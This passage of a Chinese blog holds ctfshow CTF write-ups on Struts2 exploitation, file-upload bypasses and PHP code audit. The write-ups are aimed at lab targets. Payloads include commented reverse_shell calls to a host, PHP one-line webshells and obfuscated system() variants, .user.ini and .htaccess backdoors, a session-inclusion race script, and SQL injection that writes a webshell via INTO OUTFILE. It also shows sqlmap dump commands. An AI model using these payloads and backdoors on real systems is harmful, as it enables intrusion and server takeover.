class="line"># print(s.exec_cmd(&#x27;ls -la&#x27;))</span><br><span class="line"># s.reverse_shell(&#x27;192.168.100.8&#x27;, &#x27;8888&#x27;)</span><br><span class="line"> </span><br><span class="line"># s = S2_048(&quot;http://192.168.100.8/integration/saveGangster.action&quot;, data=&#x27;name=&#123;exp&#125;&amp;age=123&amp;__checkbox_bustedBefore=true&amp;description=123&#x27;)</span><br><span class="line"># s.check()</span><br><span class="line"># print(s.exec_cmd(&#x27;ls -la&#x27;))</span><br><span class="line"># s.reverse_shell(&#x27;192.168.100.8&#x27;, &#x27;8888&#x27;)</span><br><span class="line"> </span><br><span class="line"># s = S2_053(&quot;http://192.168.100.8&quot;, data=&#x27;name=&#123;exp&#125;&#x27;)</span><br><span class="line"># s.check()</span><br><span class="line"># print(s.exec_cmd(&#x27;ls -la&#x27;))</span><br><span class="line"># s.reverse_shell(&#x27;192.168.100.8&#x27;, &#x27;8888&#x27;)</span><br><span class="line"> </span><br><span class="line"># s = S2_devMode(&quot;http://192.168.100.8/orders&quot;)</span><br><span class="line"># print(s.get_path())</span><br><span class="line"># print(s.exec_cmd(&#x27;ls -la&#x27;))</span><br><span class="line"># s.reverse_shell(&#x27;192.168.100.8&#x27;, &#x27;8888&#x27;)</span><br><span class="line"> </span><br><span class="line"># s = S2_057(&quot;http://192.168.100.8:8080/showcase/actionChain1.action&quot;)</span><br><span class="line"># print(s.check())</span><br><span class="line"># print(s.exec_cmd(&quot;cat /etc/passwd&quot;))</span><br><span class="line"># s.reverse_shell(&quot;192.168.100.8&quot;, 9999)</span><br></pre></td></tr></table></figure>



<p>试一试，总有一个工具能扫出来。</p>
<h2 id="web281"><a href="#web281" class="headerlink" title="web281"></a>web281</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python /home/zhou/桌面/Struts2Scan-main2/Struts2Scan.py -u http://e17352eb-573e-46ab-883c-f4f9c9e0b05a.challenge.ctf.show/S2-007/user.action -n S2-016 --exec</span><br></pre></td></tr></table></figure>

<p>env</p>
<h2 id="web282"><a href="#web282" class="headerlink" title="web282"></a>web282</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python /home/zhou/桌面/Struts2Scan-main2/Struts2Scan.py -u http://bacf75dd-e6b8-408f-8dbf-96393355c935.challenge.ctf.show/S2-008/ -n S2-008 --exec</span><br></pre></td></tr></table></figure>

<p>执行env命令即可</p>
<h2 id="web283"><a href="#web283" class="headerlink" title="web283"></a>web283</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python /home/zhou/桌面/scanjava -u http://f89ab82b-bf00-4be0-9fff-b4927359e0b0.challenge.ctf.show/S2-009/showcase.jsp  -n S2-008 --exec</span><br></pre></td></tr></table></figure>

<h2 id="web284"><a href="#web284" class="headerlink" title="web284"></a>web284</h2><p>没扫描出来</p>
<h2 id="web285"><a href="#web285" class="headerlink" title="web285"></a>web285</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python /home/zhou/桌面/Struts2Scan-main2/Struts2Scan.py -u http://31827834-612a-41c2-9f06-9d1c6922cc8d.challenge.ctf.show/S2-013/ -n S2-016 --exec</span><br></pre></td></tr></table></figure>

<h2 id="web286"><a href="#web286" class="headerlink" title="web286"></a>web286</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python3 /home/zhou/桌面/scanjava -u http://54a3836e-b43d-4729-9bda-c0c23a1120c1.challenge.ctf.show/S2-015/ -n S2-045 --exec</span><br></pre></td></tr></table></figure>

<h2 id="web287"><a href="#web287" class="headerlink" title="web287"></a>web287</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python3 /home/zhou/桌面/scanjava -u http://853f6c12-23a7-41ec-b348-b13be3564049.challenge.ctf.show/S2-016/ -n S2-045 --exec</span><br></pre></td></tr></table></figure>

<h2 id="web288"><a href="#web288" class="headerlink" title="web288"></a>web288</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python3 /home/zhou/桌面/scanjava -u http://d9f873ad-c396-4e2b-b7d4-67cc2985cdfc.challenge.ctf.show/S2-019/example/HelloWorld.action -n S2-045 --exec</span><br></pre></td></tr></table></figure>

<h2 id="web289"><a href="#web289" class="headerlink" title="web289"></a>web289</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python3 /home/zhou/桌面/scanjava -u http://d6d16853-7bbc-4a03-8ade-233139abddc1.challenge.ctf.show/S2-029/ -n S2-045 --exec</span><br></pre></td></tr></table></figure>

<h2 id="web290"><a href="#web290" class="headerlink" title="web290"></a>web290</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python3 /home/zhou/桌面/scanjava -u http://fe185d70-2910-4b03-b06d-fe4fe6f17e45.challenge.ctf.show/S2-032/ -n S2-045 --exec</span><br></pre></td></tr></table></figure>

<h2 id="web291"><a href="#web291" class="headerlink" title="web291"></a>web291</h2>]]></content>
      <tags>
        <tag>ctfshow</tag>
      </tags>
  </entry>
  <entry>
    <title>ctfshow文件上传</title>
    <url>/2023/02/15/ctfshow%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/</url>
    <content><![CDATA[<p>  文件上传</p>
 <span id="more"></span>

<p>绕过&lt;?  用</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;script language=<span class="string">&quot;php&quot;</span>&gt;<span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>]);&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<p>后缀改为 phtml</p>
<h2 id="web155"><a href="#web155" class="headerlink" title="web155"></a>web155</h2><p><a href="https://blog.csdn.net/miuzzx/article/details/109537262">(9条消息) CTFSHOW文件上传篇_ctfshow web162_yu22x的博客-CSDN博客</a></p>
<p>php段标签绕过</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure>



<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?=(表达式)?&gt;  等价于 &lt;?php echo (表达式)?&gt;</span><br><span class="line">&lt;?=eval($_POST[1])?&gt;</span><br></pre></td></tr></table></figure>

<h2 id="web156"><a href="#web156" class="headerlink" title="web156"></a>web156</h2><p>过滤了[],用花括号代替</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?=eval($_POST&#123;1&#125;)?&gt;</span><br></pre></td></tr></table></figure>

<h2 id="web162163"><a href="#web162163" class="headerlink" title="web162163"></a>web162163</h2><p>session文件包含</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import requests</span><br><span class="line">import threading</span><br><span class="line">session=requests.session()</span><br><span class="line">sess=&#x27;yu22x&#x27;</span><br><span class="line">url1=&quot;http://f275f432-9203-4050-99ad-a185d3b6f466.chall.ctf.show/&quot;</span><br><span class="line">url2=&quot;http://f275f432-9203-4050-99ad-a185d3b6f466.chall.ctf.show/upload&quot;</span><br><span class="line">data1=&#123;</span><br><span class="line">	&#x27;PHP_SESSION_UPLOAD_PROGRESS&#x27;:&#x27;&lt;?php system(&quot;tac ../f*&quot;);?&gt;&#x27;</span><br><span class="line">&#125;</span><br><span class="line">file=&#123;</span><br><span class="line">	&#x27;file&#x27;:&#x27;yu22x&#x27;</span><br><span class="line">&#125;</span><br><span class="line">cookies=&#123;</span><br><span class="line">	&#x27;PHPSESSID&#x27;: sess</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">def write():</span><br><span class="line">	while True:</span><br><span class="line">		r = session.post(url1,data=data1,files=file,cookies=cookies)</span><br><span class="line">def read():</span><br><span class="line">	while True:</span><br><span class="line">		r = session.get(url2)</span><br><span class="line">		if &#x27;flag&#x27; in r.text:</span><br><span class="line">			print(r.text)</span><br><span class="line">			</span><br><span class="line">threads = [threading.Thread(target=write),</span><br><span class="line">       threading.Thread(target=read)]</span><br><span class="line">for t in threads:</span><br><span class="line">	t.start()</span><br></pre></td></tr></table></figure>



<h2 id="web164"><a href="#web164" class="headerlink" title="web164"></a>web164</h2><p>png图片二次渲染绕过</p>
<h2 id="web165"><a href="#web165" class="headerlink" title="web165"></a>web165</h2><h2 id="web166"><a href="#web166" class="headerlink" title="web166"></a>web166</h2><p>传一个一句话压缩包即可</p>
<h2 id="web167"><a href="#web167" class="headerlink" title="web167"></a>web167</h2><p><strong>.user.ini文件构成的PHP后门</strong></p>
<p>php.ini 是 php 的一个全局配置文件，对整个 web 服务起作用；</p>
<p>.user.ini 使用范围很广，不仅限于 Apache 服务器，同样适用于 Nginx 服务器</p>
<p>从被执行的 PHP 文件所在目录开始一直上升到 web 根目录</p>
<p><code>auto_prepend_file = 1.jpg</code> 这个配置的意思就是在当前目录下的.php 文件包含 1.jpg 这个图片，在此处相当于在 11.php 文件头插入了 <code>require(&#39;1.jpg&#39;)</code> 这条语句，也就是说相当于文件包含。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">auto_prepend_file = &lt;filename&gt;         //包含在文件头</span><br><span class="line">auto_append_file = &lt;filename&gt;          //包含在文件尾</span><br></pre></td></tr></table></figure>

<p><strong>.htaccess 配置文件</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SetHandler application/x-httpd-php</span><br></pre></td></tr></table></figure>

<p>将所有文件都解析为 php 文件,只对该文件所在目录下的文件起作用。只在 Apache 服务器中起作用。</p>
<h2 id="web168"><a href="#web168" class="headerlink" title="web168"></a>web168</h2><p>免杀</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$a = &quot;s#y#s#t#e#m&quot;;</span><br><span class="line">$b = explode(&quot;#&quot;,$a);</span><br><span class="line">$c = $b[0].$b[1].$b[2].$b[3].$b[4].$b[5];</span><br><span class="line">$c($_REQUEST[1]);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>



<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$a=substr(&#x27;1s&#x27;,1).&#x27;ystem&#x27;;</span><br><span class="line">$a($_REQUEST[1]);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>



<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$a=substr(&#x27;1s&#x27;,1).&#x27;ystem&#x27;;</span><br><span class="line">$a($_REQUEST[1]);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>



<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$a=$_REQUEST[&#x27;a&#x27;];</span><br><span class="line">$b=$_REQUEST[&#x27;b&#x27;];</span><br><span class="line">$a($b);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>



<h2 id="web170"><a href="#web170" class="headerlink" title="web170"></a>web170</h2><p>关键词 <code>layui</code> upload</p>
<p>前端验证必须是zip</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;button type=<span class="string">&quot;button&quot;</span> <span class="class"><span class="keyword">class</span>=&quot;<span class="title">layui</span>-<span class="title">btn</span>&quot; <span class="title">id</span>=&quot;<span class="title">upload</span>&quot; <span class="title">lay</span>-<span class="title">data</span>=&quot;</span>&#123;url: <span class="string">&#x27;upload.php&#x27;</span>, accept: <span class="string">&#x27;images&#x27;</span>,exts:<span class="string">&#x27;zip&#x27;</span>&#125;<span class="string">&quot;&gt;</span></span><br><span class="line"><span class="string">			  &lt;i class=&quot;</span>layui-icon<span class="string">&quot;&gt;&amp;#xe67c;&lt;/i&gt;上传文件</span></span><br></pre></td></tr></table></figure>

<p>通过尝试&lt;&gt;被杀了</p>
<p>后端验证必须是png文件</p>
<p>-Disposition: form-data; name&#x3D;”file”; filename&#x3D;”.user.zip”<br>Content-Type: application&#x2F;x-zip-compressed</p>
<p>创建一个压缩包.user.zip 记事本打开</p>
<p><code>auto_append_file</code> string</p>
<p>指定在主文件之后自动解析的文件名。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">GIF89A</span><br><span class="line">auto_append_file=&quot;/var/log/nginx/access.log&quot;</span><br></pre></td></tr></table></figure>

<p>即修改为 .user.ini</p>
<p>类型修改为image&#x2F;png</p>
<p>同时user-agent传入一句话木马</p>
<p>即可上传</p>
<p>同理同时，再上传一个1.php，内容随便</p>
<p>一剑连接upload&#x2F;1.php</p>
<p>在根目录下&#x2F;var&#x2F;www&#x2F;html&#x2F;下</p>
<p>auto_append_file类似，只是在文件后面包含。 使用方法很简单，直接写在.user.ini中</p>
<p><a href="https://blog.csdn.net/weixin_53146913/article/details/124840296?ops_request_misc=%7B%22request_id%22:%22167645042416782429787891%22,%22scm%22:%2220140713.130102334..%22%7D&request_id=167645042416782429787891&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-1-124840296-null-null.142%5Ev73%5Epc_new_rank,201%5Ev4%5Eadd_ask,239%5Ev1%5Econtrol&utm_term=user.ini&spm=1018.2226.3001.4187">(13条消息) 【文件上传漏洞】user.ini留后门_菜菜zhao的博客-CSDN博客_.user.ini</a></p>
]]></content>
      <categories>
        <category>ctfshow</category>
      </categories>
      <tags>
        <tag>文件上传</tag>
      </tags>
  </entry>
  <entry>
    <title>ctfshow代码审计</title>
    <url>/2023/03/16/ctfshow%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/</url>
    <content><![CDATA[<p>代码审计</p>
  <span id="more"></span>


<h2 id="web301"><a href="#web301" class="headerlink" title="web301"></a>web301</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="keyword">require</span> <span class="string">&#x27;conn.php&#x27;</span>;</span><br><span class="line"><span class="variable">$_POST</span>[<span class="string">&#x27;userid&#x27;</span>]=!<span class="keyword">empty</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;userid&#x27;</span>])?<span class="variable">$_POST</span>[<span class="string">&#x27;userid&#x27;</span>]:<span class="string">&quot;&quot;</span>;</span><br><span class="line"><span class="variable">$_POST</span>[<span class="string">&#x27;userpwd&#x27;</span>]=!<span class="keyword">empty</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;userpwd&#x27;</span>])?<span class="variable">$_POST</span>[<span class="string">&#x27;userpwd&#x27;</span>]:<span class="string">&quot;&quot;</span>;</span><br><span class="line"><span class="variable">$username</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;userid&#x27;</span>];</span><br><span class="line"><span class="variable">$userpwd</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;userpwd&#x27;</span>];</span><br><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;select sds_password from sds_user where sds_username=&#x27;&quot;</span>.<span class="variable">$username</span>.<span class="string">&quot;&#x27; order by id limit 1;&quot;</span>;</span><br><span class="line"><span class="variable">$result</span>=<span class="variable">$mysqli</span>-&gt;<span class="title function_ invoke__">query</span>(<span class="variable">$sql</span>);<span class="comment">//在 PHP 中，有两种常用接口用于连接 MySQL 数据库并与之交互：`mysqli`和`PDO`.</span></span><br><span class="line"><span class="variable">$row</span>=<span class="variable">$result</span>-&gt;<span class="title function_ invoke__">fetch_array</span>(MYSQLI_BOTH);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$result</span>-&gt;num_rows&lt;<span class="number">1</span>)&#123;</span><br><span class="line">	<span class="variable">$_SESSION</span>[<span class="string">&#x27;error&#x27;</span>]=<span class="string">&quot;1&quot;</span>;</span><br><span class="line">	<span class="title function_ invoke__">header</span>(<span class="string">&quot;location:login.php&quot;</span>);</span><br><span class="line">	<span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">strcasecmp</span>(<span class="variable">$userpwd</span>,<span class="variable">$row</span>[<span class="string">&#x27;sds_password&#x27;</span>]))&#123;</span><br><span class="line">	<span class="variable">$_SESSION</span>[<span class="string">&#x27;login&#x27;</span>]=<span class="number">1</span>;</span><br><span class="line">	<span class="variable">$result</span>-&gt;<span class="title function_ invoke__">free</span>();</span><br><span class="line">	<span class="variable">$mysqli</span>-&gt;<span class="title function_ invoke__">close</span>();</span><br><span class="line">	<span class="title function_ invoke__">header</span>(<span class="string">&quot;location:index.php&quot;</span>);</span><br><span class="line">	<span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;error&#x27;</span>]=<span class="string">&quot;1&quot;</span>;</span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&quot;location:login.php&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>源码下载地址<a href="https://ctfshow.lanzoui.com/ilMPgjfeyxa">https://ctfshow.lanzoui.com/ilMPgjfeyxa</a></p>
<p>使用<code>mysqli</code>，您可以执行所有常见的数据库操作，例如查询、插入、更新和删除数据。</p>
<p>解法一payload：</p>
<p>1’ union select 1# ‘;</p>
<p>1；原理如下</p>
<p><a href="https://blog.csdn.net/q20010619/article/details/120592532">(10条消息) CTFshow刷题日记-WEB-代码审计(web301-310)SQL注入、SSRF打MySQL、SSRF打FastCGI、SSRF文件读取_ctfshow web303_OceanSec的博客-CSDN博客</a></p>
<p>解法二sqlmap</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sqlmap -u http://a17db188-9423-4e2a-93a0-441830d878d6.challenge.ctf.show/checklogin.php --dump --forms --batch</span><br></pre></td></tr></table></figure>

<p>  checklogin.php 源码如下，能跑但只能跑</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$username=$_POST[&#x27;userid&#x27;];</span><br><span class="line">$userpwd=$_POST[&#x27;userpwd&#x27;];</span><br><span class="line">$sql=&quot;select sds_password from sds_user where sds_username=&#x27;&quot;.$username.&quot;&#x27; order by id limit 1;&quot;;</span><br><span class="line">$result=$mysqli-&gt;query($sql);</span><br></pre></td></tr></table></figure>

<p>forms 选择post 传参，batch选择自动yes</p>
<p>由于上面跑的太慢也可以选择sql 6连</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sqlmap -u http://a17db188-9423-4e2a-93a0-441830d878d6.challenge.ctf.show/checklogin.php --forms --batch --current-db</span><br><span class="line">//跑出数据库sds</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sqlmap -u http://a17db188-9423-4e2a-93a0-441830d878d6.challenge.ctf.show/checklogin.php --forms --batch --tables -D &quot;sds&quot;</span><br><span class="line">//跑出表 sds_user</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sqlmap -u http://a17db188-9423-4e2a-93a0-441830d878d6.challenge.ctf.show/checklogin.php --forms --batch --columns  -T &quot;sds_user&quot; -D &quot;sds&quot;   </span><br></pre></td></tr></table></figure>

<p> 跑出字段</p>
<p>sds_password<br> sds_username </p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sqlmap -u http://f922feab-0cee-4250-bf07-c4fe567b6974.challenge.ctf.show/checklogin.php --forms --batch --dump  -T &quot;sds_user&quot; -D &quot;sds&quot; -C &quot;sds_password&quot; </span><br></pre></td></tr></table></figure>

<p>跑出密码：ctfshowwwww    登陆即可</p>
<p>解法三</p>
<p>username</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27; union select &#x27;&lt;?php eval($_POST[1]);?&gt;&#x27; into outfile &#x27;/var/www/html/1.php&#x27;#</span><br></pre></td></tr></table></figure>

<p>passwd&#x3D;1</p>
<p>访问url&#x2F;1.php </p>
<p>蚁剑连接</p>
<p><a href="https://blog.csdn.net/zhengxijia2012/article/details/73437376?ops_request_misc=%7B%22request_id%22:%22167894875516800225569050%22,%22scm%22:%2220140713.130102334..%22%7D&request_id=167894875516800225569050&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~baidu_landing_v2~default-2-73437376-null-null.142%5Ev73%5Epc_new_rank,201%5Ev4%5Eadd_ask,239%5Ev2%5Einsert_chatgpt&utm_term=$_SESSION&spm=1018.2226.3001.4187">(10条消息) php之$_SESSION的理解_php $_session_友缘聚友的博客-CSDN博客</a></p>
<p>ctfshow{7623027b-8b89-4757-8f8f-5f10d6a87c1b}</p>
<h2 id="web302"><a href="#web302" class="headerlink" title="web302"></a>web302</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">if(!strcasecmp(sds_decode($userpwd),$row[&#x27;sds_password&#x27;]))&#123;</span><br></pre></td></tr></table></figure>

<p>下载后源码后wp不符，按wp的来</p>
<p>登录时判断了被 sds_decode() 处理后的密码是否和查询出来的密码一致</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">sds_decode</span>(<span class="params"><span class="variable">$str</span></span>)</span>&#123;</span><br><span class="line">	<span class="keyword">return</span> <span class="title function_ invoke__">md5</span>(<span class="title function_ invoke__">md5</span>(<span class="variable">$str</span>.<span class="title function_ invoke__">md5</span>(<span class="title function_ invoke__">base64_encode</span>(<span class="string">&quot;sds&quot;</span>))).<span class="string">&quot;sds&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>上题解法一用不了了</p>
<p>可以</p>
<p>上题payload写shell依旧能用</p>
<p>ctfshow{b85b90e6-b5cc-46c1-93e2-1c421de498a0}</p>
<h2 id="web303"><a href="#web303" class="headerlink" title="web303"></a>web303</h2><p>在sql查询之前加入了</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">strlen</span>(<span class="variable">$username</span>)&gt;<span class="number">6</span>)&#123;</span><br><span class="line">	<span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>但试了试，admin,admin即可进入。</p>
<p>审计源码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="keyword">require</span> <span class="string">&#x27;conn.php&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;login&#x27;</span>]))&#123;</span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&quot;location:login.php&quot;</span>);</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">	<span class="comment">//注入点</span></span><br><span class="line">	<span class="variable">$_POST</span>[<span class="string">&#x27;dpt_name&#x27;</span>]=!<span class="keyword">empty</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;dpt_name&#x27;</span>])?<span class="variable">$_POST</span>[<span class="string">&#x27;dpt_name&#x27;</span>]:<span class="literal">NULL</span>;</span><br><span class="line">	<span class="variable">$_POST</span>[<span class="string">&#x27;dpt_address&#x27;</span>]=!<span class="keyword">empty</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;dpt_address&#x27;</span>])?<span class="variable">$_POST</span>[<span class="string">&#x27;dpt_address&#x27;</span>]:<span class="literal">NULL</span>;</span><br><span class="line">	<span class="variable">$_POST</span>[<span class="string">&#x27;dpt_build_year&#x27;</span>]=!<span class="keyword">empty</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;dpt_build_year&#x27;</span>])?<span class="variable">$_POST</span>[<span class="string">&#x27;dpt_build_year&#x27;</span>]:<span class="literal">NULL</span>;</span><br><span class="line">	<span class="variable">$_POST</span>[<span class="string">&#x27;dpt_has_cert&#x27;</span>]=!<span class="keyword">empty</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;dpt_has_cert&#x27;</span>])?<span class="variable">$_POST</span>[<span class="string">&#x27;dpt_has_cert&#x27;</span>]:<span class="literal">NULL</span>;</span><br><span class="line">	<span class="variable">$_POST</span>[<span class="string">&#x27;dpt_cert_number&#x27;</span>]=!<span class="keyword">empty</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;dpt_cert_number&#x27;</span>])?<span class="variable">$_POST</span>[<span class="string">&#x27;dpt_cert_number&#x27;</span>]:<span class="literal">NULL</span>;</span><br><span class="line">	<span class="variable">$_POST</span>[<span class="string">&#x27;dpt_telephone_number&#x27;</span>]=!<span class="keyword">empty</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;dpt_telephone_number&#x27;</span>])?<span class="variable">$_POST</span>[<span class="string">&#x27;dpt_telephone_number&#x27;</span>]:<span class="literal">NULL</span>;</span><br><span class="line">	<span class="variable">$dpt_name</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;dpt_name&#x27;</span>];</span><br><span class="line">	<span class="variable">$dpt_address</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;dpt_address&#x27;</span>];</span><br><span class="line">	<span class="variable">$dpt_build_year</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;dpt_build_year&#x27;</span>];</span><br><span class="line">	<span class="variable">$dpt_has_cert</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;dpt_has_cert&#x27;</span>]==<span class="string">&quot;on&quot;</span>?<span class="string">&quot;1&quot;</span>:<span class="string">&quot;0&quot;</span>;</span><br><span class="line">	<span class="variable">$dpt_cert_number</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;dpt_cert_number&#x27;</span>];</span><br><span class="line">	<span class="variable">$dpt_telephone_number</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;dpt_telephone_number&#x27;</span>];</span><br><span class="line">	<span class="variable">$mysqli</span>-&gt;<span class="title function_ invoke__">query</span>(<span class="string">&quot;set names utf-8&quot;</span>);</span><br><span class="line">	<span class="variable">$sql</span>=<span class="string">&quot;insert into sds_dpt set sds_name=&#x27;&quot;</span>.<span class="variable">$dpt_name</span>.<span class="string">&quot;&#x27;,sds_address =&#x27;&quot;</span>.<span class="variable">$dpt_address</span>.<span class="string">&quot;&#x27;,sds_build_date=&#x27;&quot;</span>.<span class="variable">$dpt_build_year</span>.<span class="string">&quot;&#x27;,sds_have_safe_card=&#x27;&quot;</span>.<span class="variable">$dpt_has_cert</span>.<span class="string">&quot;&#x27;,sds_safe_card_num=&#x27;&quot;</span>.<span class="variable">$dpt_cert_number</span>.<span class="string">&quot;&#x27;,sds_telephone=&#x27;&quot;</span>.<span class="variable">$dpt_telephone_number</span>.<span class="string">&quot;&#x27;;&quot;</span>;</span><br><span class="line">	<span class="variable">$result</span>=<span class="variable">$mysqli</span>-&gt;<span class="title function_ invoke__">query</span>(<span class="variable">$sql</span>);</span><br><span class="line">	<span class="keyword">echo</span> <span class="variable">$sql</span>;</span><br><span class="line">	<span class="keyword">if</span>(<span class="variable">$result</span>===<span class="literal">true</span>)&#123;</span><br><span class="line">		<span class="variable">$mysqli</span>-&gt;<span class="title function_ invoke__">close</span>();</span><br><span class="line">		<span class="title function_ invoke__">header</span>(<span class="string">&quot;location:dpt.php&quot;</span>);</span><br><span class="line">	&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">		<span class="keyword">die</span>(<span class="title function_ invoke__">mysqli_error</span>(<span class="variable">$mysqli</span>));</span><br><span class="line">	&#125;</span><br><span class="line">	 &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>既然都说是注入点了，注入一下试试。</p>
<h2 id="web305"><a href="#web305" class="headerlink" title="web305"></a>web305</h2><p>class.php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">user</span></span>&#123;</span><br><span class="line">	<span class="keyword">public</span> <span class="variable">$username</span>;</span><br><span class="line">	<span class="keyword">public</span> <span class="variable">$password</span>;</span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$u</span>,<span class="variable">$p</span></span>)</span>&#123;</span><br><span class="line">		<span class="variable language_">$this</span>-&gt;username=<span class="variable">$u</span>;</span><br><span class="line">		<span class="variable language_">$this</span>-&gt;password=<span class="variable">$p</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">		<span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$this</span>-&gt;username, <span class="variable">$this</span>-&gt;password);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>注入点在checklogin.php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$user_cookie</span> = <span class="variable">$_COOKIE</span>[<span class="string">&#x27;user&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$user_cookie</span>))&#123;</span><br><span class="line">	<span class="variable">$user</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$user_cookie</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>反序列化写脚本</p>
